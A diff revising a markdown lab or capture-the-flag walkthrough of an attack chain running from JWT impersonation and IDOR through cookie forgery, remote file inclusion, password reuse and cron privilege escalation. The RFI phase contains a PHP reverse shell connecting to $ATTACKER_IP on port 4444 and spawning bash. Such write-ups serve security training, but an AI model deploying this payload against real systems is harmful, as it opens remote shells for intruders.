@@ -32,9 +32,9 @@ Anonymous
  └── User Enumeration
       ↓
 emma.taylor
- └── JWT Manipersonation
+ └── JWT Impersonation
       ↓
-Admin API Access
+Admin JWT
  └── IDOR
       ↓
 Admin Session Cookie Forgery
@@ -56,7 +56,6 @@ root
 - Web Application Enumeration
 - Directory Enumeration
 - User Enumeration
-- Password Brute Forcing
 - Password Spraying
 - JWT Analysis and Manipulation
 - IDOR Exploitation
@@ -69,6 +68,7 @@ root
 - Cron Job Abuse
 - TTY Stabilization
 - Post-exploitation Enumeration
+- PHP Source Code Review
 
 ---
 
@@ -390,7 +390,7 @@ Because authorization checks are missing, any authenticated account can retrieve
 
 Continue enumerating user identifiers until the administrator's complete profile is recovered.
 
-The disclosed information includes values later used to construct a privileged session.
+Although the IDOR does not directly provide code execution, it exposes administrative information required for the next stage of the attack, where a forged administrator session is created.
 
 No additional exploitation is required beyond manipulating the request parameter.
 
@@ -420,69 +420,7 @@ IDOR vulnerabilities are among the most common access control issues found durin
 
 ## Objective
 
-Forge a valid administrator session cookie by exploiting weaknesses in the application's cookie generation mechanism.
-
-## Enumeration
-
-Further inspection of the application reveals that authenticated sessions are represented using a separate cookie.
-
-Unlike the JWT, this cookie appears to consist of encoded user information followed by a predictable signature.
-
-Example:
-
-```text
-username=emma.taylor|signature
-```
-
-Analysis of the application's behavior suggests that the signature is generated using a predictable or recoverable secret.
-
-Once the signing method is understood, arbitrary cookies can be generated for any user.
-
-## Exploitation
-
-Generate a forged cookie for the administrator account.
-
-Example:
-
-```text
-username=admin|<valid signature>
-```
-
-Replace the existing session cookie within the browser.
-
-Refresh the application.
-
-The server now accepts the forged cookie and establishes a fully privileged administrator session.
-
-Administrative functionality previously hidden from standard users is now available.
-
-## Why This Worked
-
-Session cookies are intended to prove that the server created the authenticated session.
-
-If the signing secret is predictable, disclosed, or otherwise recoverable, attackers can generate arbitrary cookies that appear completely legitimate.
-
-Rather than compromising the authentication process itself, this attack compromises the application's trust model by forging credentials accepted as genuine by the server.
-
-Properly generated cryptographic signatures using strong, secret keys prevent this type of attack.
-
-## Key Takeaways
-
-- Session cookies should always be cryptographically protected.
-- Weak signing secrets undermine the integrity of authentication mechanisms.
-- Predictable cookie generation frequently results in privilege escalation.
-- Administrative functionality should never rely solely on client-controlled values.
-
-</details>
-
----
-
-<details>
-<summary><strong>Phase 6 – Administrative Session Cookie Forgery</strong></summary>
-
-## Objective
-
-Forge a valid administrator session by abusing a leaked application signing secret to generate a trusted authentication cookie.
+Forge a cryptographically valid administrator session cookie by abusing a leaked application signing secret to generate a trusted authentication cookie.
 
 ## Enumeration
 
@@ -575,7 +513,7 @@ This illustrates how exposing application secrets can completely undermine other
 ---
 
 <details>
-<summary><strong>Phase 7 – Remote File Inclusion to Remote Code Execution</strong></summary>
+<summary><strong>Phase 6 – Remote File Inclusion to Remote Code Execution</strong></summary>
 
 ## Objective
 
@@ -583,7 +521,7 @@ Obtain remote code execution by abusing a Remote File Inclusion (RFI) vulnerabil
 
 ## Enumeration
 
-Continue assessing the vulnerable file API.
+After obtaining administrative access, continue assessing the application's file API for additional attack vectors.
 
 Inspection of the source code reveals the following implementation.
 
@@ -605,8 +543,8 @@ Create a simple PHP reverse shell.
 
 ```php
 <?php
-$sock = fsockopen("$ATTACKER_IP", 4444);
-exec("/bin/bash -i <&3 >&3 2>&3");
+$sock = fsockopen("$ATTACKER_IP",4444);
+$proc = proc_open("/bin/bash -i", array(0=>$sock,1=>$sock,2=>$sock), $pipes);
 ?>
 ```
 
@@ -679,7 +617,7 @@ This demonstrates how combining unrestricted remote file inclusion with dynamic 
 ---
 
 <details>
-<summary><strong>Phase 8 – Password Reuse and Lateral Movement</strong></summary>
+<summary><strong>Phase 7 – Password Reuse and Lateral Movement</strong></summary>
 
 ## Objective
 
@@ -749,6 +687,8 @@ Although the recovered password was intended for database authentication, it had
 
 Credential reuse dramatically increases the impact of an initial compromise because attackers can pivot between services without exploiting additional vulnerabilities.
 
+This is a common post-exploitation technique during internal assessments because application credentials are frequently reused for operating system accounts.
+
 Rather than attacking SSH or Linux authentication directly, the compromise relied entirely on poor credential management.
 
 ## Key Takeaways
@@ -763,7 +703,7 @@ Rather than attacking SSH or Linux authentication directly, the compromise relie
 ---
 
 <details>
-<summary><strong>Phase 9 – Cron Job Privilege Escalation</strong></summary>
+<summary><strong>Phase 8 – Cron Job Privilege Escalation</strong></summary>
 
 ## Objective
 
@@ -914,6 +854,7 @@ This demonstrates how writable scripts executed by privileged automation can res
 | Reconnaissance | Active Scanning | T1595 |
 | Credential Access | Password Spraying | T1110.003 |
 | Credential Access | Unsecured Credentials | T1552 |
+| Credential Access | Credentials in Files | T1552.001 |
 | Initial Access | Valid Accounts | T1078 |
 | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
 | Discovery | Process Discovery | T1057 |
